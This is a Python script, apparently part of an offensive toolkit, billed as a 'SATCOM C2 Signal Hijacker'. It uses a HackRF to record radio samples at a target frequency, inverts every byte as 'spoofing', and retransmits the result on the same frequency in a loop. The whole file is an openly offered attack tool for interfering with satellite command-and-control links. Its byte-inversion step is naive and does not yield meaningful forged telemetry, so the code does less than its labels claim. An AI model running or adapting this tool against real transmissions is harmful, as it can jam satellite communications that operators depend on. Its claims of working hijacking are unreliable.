#!/usr/bin/env python3
# Path: modules/attacks/satcom_c2_hijacker.py

import subprocess
import argparse
import os
import time
import hashlib
import json
from datetime import datetime

CAPTURE_FILE = "satcom_capture.iq"
MODIFIED_FILE = "satcom_modified.iq"
METADATA_FILE = "results/satcom_hijack_metadata.json"
os.makedirs("results", exist_ok=True)

def color(msg, level="info"):
    if not os.isatty(1): return msg
    colors = {"info": "\033[94m", "warn": "\033[93m", "fail": "\033[91m", "ok": "\033[92m", "end": "\033[0m"}
    return f"{colors.get(level, '')}{msg}{colors['end']}"

def sha256sum(file_path):
    h = hashlib.sha256()
    with open(file_path, 'rb') as f:
        while chunk := f.read(8192):
            h.update(chunk)
    return h.hexdigest()

def capture_satcom_signal(frequency, sample_rate, duration, gain):
    print(color(f"[+] Capturing SATCOM signal at {frequency/1e6:.2f} MHz...", "info"))
    command = [
        "hackrf_transfer",
        "-r", CAPTURE_FILE,
        "-f", str(frequency),
        "-s", str(sample_rate),
        "-l", str(gain),
        "-n", str(sample_rate * duration)
    ]
    subprocess.run(command, check=True)
    print(color(f"[✓] Capture saved: {CAPTURE_FILE}", "ok"))

def manipulate_signal(original_file, modified_file):
    print(color("[+] Manipulating telemetry signal...", "info"))
    with open(original_file, "rb") as orig, open(modified_file, "wb") as mod:
        data = bytearray(orig.read())
        for i in range(len(data)):
            data[i] = ~data[i] & 0xFF
        mod.write(data)
    print(color(f"[✓] Spoofed signal saved: {modified_file}", "ok"))

def replay_modified_signal(modified_file, frequency, sample_rate, gain):
    print(color(f"[+] Replaying spoofed signal at {frequency/1e6:.2f} MHz", "info"))
    command = [
        "hackrf_transfer",
        "-t", modified_file,
        "-f", str(frequency),
        "-s", str(sample_rate),
        "-x", str(gain),
        "-R"
    ]
    subprocess.run(command, check=True)
    print(color("[✓] Replay complete", "ok"))

def export_metadata(freq, rate, dur, gain):
    meta = {
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "frequency_hz": freq,
        "sample_rate": rate,
        "duration_sec": dur,
        "gain": gain,
        "capture_file": CAPTURE_FILE,
        "capture_sha256": sha256sum(CAPTURE_FILE),
        "modified_file": MODIFIED_FILE,
        "modified_sha256": sha256sum(MODIFIED_FILE)
    }
    with open(METADATA_FILE, "w") as f:
        json.dump(meta, f, indent=2)
    print(color(f"[+] Metadata exported to {METADATA_FILE}", "info"))

def cleanup(preserve=False):
    if preserve:
        print(color("[!] Skipping cleanup (persistent mode)", "warn"))
        return
    print(color("[+] Cleaning up temporary IQ files...", "info"))
    for file in [CAPTURE_FILE, MODIFIED_FILE]:
        if os.path.exists(file):
            os.remove(file)
            print(color(f"[✓] Removed: {file}", "ok"))

def main():
    parser = argparse.ArgumentParser(description="SATCOM C2 Signal Hijacker using HackRF")
    parser.add_argument("--frequency", type=int, required=True, help="Target frequency in Hz")
    parser.add_argument("--sample-rate", type=int, default=2000000, help="Sample rate (default 2 MHz)")
    parser.add_argument("--duration", type=int, default=10, help="Capture duration in seconds")
    parser.add_argument("--gain", type=int, default=40, help="Gain level (default 40)")
    parser.add_argument("--no-cleanup", action="store_true", help="Preserve IQ files for manual replay")

    args = parser.parse_args()

    try:
        capture_satcom_signal(args.frequency, args.sample_rate, args.duration, args.gain)
        manipulate_signal(CAPTURE_FILE, MODIFIED_FILE)
        export_metadata(args.frequency, args.sample_rate, args.duration, args.gain)
        replay_modified_signal(MODIFIED_FILE, args.frequency, args.sample_rate, args.gain)
    except KeyboardInterrupt:
        print(color("\n[!] Attack interrupted by user", "fail"))
    except subprocess.CalledProcessError as e:
        print(color(f"[!] Error during execution: {e}", "fail"))
    finally:
        cleanup(preserve=args.no_cleanup)

if __name__ == "__main__":
    main()
